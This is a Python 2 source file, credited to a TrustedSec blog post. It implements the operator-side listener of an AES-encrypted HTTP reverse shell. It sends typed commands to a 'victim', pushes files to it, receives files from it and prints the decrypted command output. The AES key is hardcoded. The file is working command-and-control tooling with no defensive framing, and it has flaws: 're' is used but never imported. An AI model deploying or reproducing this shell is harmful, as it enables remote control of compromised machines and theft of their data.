#!/usr/bin/python2
#Source: https://www.trustedsec.com/2012/03/building-a-native-http-shell-with-aes-in-python/

import BaseHTTPServer
import os
import cgi
import base64
import os
from Crypto.Cipher import AES
import urllib

##########################################################################
# Encryption
###########################################################################
BLOCK_SIZE = 32 # block size for AES

#for padding (plaintext may not be a multiple of the blocksize)
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#secret squirrel
secret = 'Go30@Fe04*1@9dg+-_;s~j2dfsv^,z2='

cipher = AES.new(secret)

def encryption(stuff):
        message = EncodeAES(cipher, stuff) # encrypt data with AES
        value = base64.b64encode(message) # encode stdout data
        return value

def decryption(stuff):
        message = base64.b64decode(stuff)
        value = DecodeAES(cipher, message)
        return value
###########################################################################

# url decoding for postbacks
def htc(m):
        return chr(int(m.group(1),16))

#url decoding
def urldecode(url):
        rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
        return rex.sub(htc,url)

class GetHandler(BaseHTTPServer.BaseHTTPRequestHandler):
        # handle GET requests
        def do_GET(self):
                temp = []
                temp = (self.path).split("/")
                try:
                        if temp[1]:
                                if os.path.exists(temp[1]):
                                        self.send_response(200) # send a 200 OK repsonse
                                        self.send_header("Content-type", "text/html") # end headers
                                        self.end_headers()
                                        file = open(temp[1], "rb")
                                        data = encryption(file.read())
                                        self.wfile.write(data)
                                        file.close()
                                        print "File Upload complete."
                                        return
                                else:
                                        print "File does not exist for uploading"
                                        return
                        elif temp[3]:
                                if os.path.exists(temp[3]): 
                                        self.send_response(200) # send a 200 OK repsonse
                                        self.send_header("Content-type", "text/html") # end headers
                                        self.end_headers()
                                        file = open(temp[3], "rb")
                                        data = encryption(file.read())
                                        self.wfile.write(data)
                                        file.close()
                                        print "File Upload complete."
                                        return
                                else:
                                        print "File does not exist for uploading"
                                        return
                except Exception as e:
                        print "Waiting for command"


                command = raw_input("HTTP-reverse-shell> ")

                self.send_response(200) # send a 200 OK repsonse
                self.send_header("Content-type", "text/html") # end headers
                self.end_headers()
                message = encryption(command)
                self.wfile.write(message) # write command shell param to victim

        # handle POST requests
        def do_POST(self):
                if r'/!download!' in self.path:
                        try:
                                ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
                                if ctype == 'multipart/form-data': # or ctype == 'form-data' :
                                        fs = cgi.FieldStorage( fp = self.rfile, headers = self.headers, environ={'REQUEST_METHOD':'POST'})
                                else:
                                        print "[-] Unexcepted POST request"

                                fs_up = fs['file'] # using the key 'file' from dictionry

                                with open('downloaded_file.txt', 'wb+') as o:
                                        o.write( fs_up.file.read() )
                                        self.send_response(200)
                                        self.end_headers()

                        except Exception as e:
                                print "Waiting for command"

                        print "File Download complete:  downloaded_file.txt"
                        print "***Please rename file before downloading next file***"
                        return # exit function once file is stores

                self.send_response(200) # send 200 OK repsonse
                self.end_headers() # end headers
                length = int(self.headers['Content-Length']) # get length of POST data
                message = self.rfile.read(length)
                message = decryption(message)
                print message

if __name__ == '__main__':
        server_class = BaseHTTPServer.HTTPServer
        port = raw_input("Choose which port to receive connections: ")
        httpd = server_class(("", int(port)), GetHandler)
        print "===================================================================="
        print "We are listening on port " + port
        print " => Press Ctrl-c to stop Encrypted HTTP web shell."
        print " => Type 'quit' or 'exit' to drop connections."
        print "--------------------------------------------------------------------"

        try:
                httpd.serve_forever()
        except KeyboardInterrupt:
                print "[!] Exiting Encrypted HTTP web shell."
                httpd.server_close()

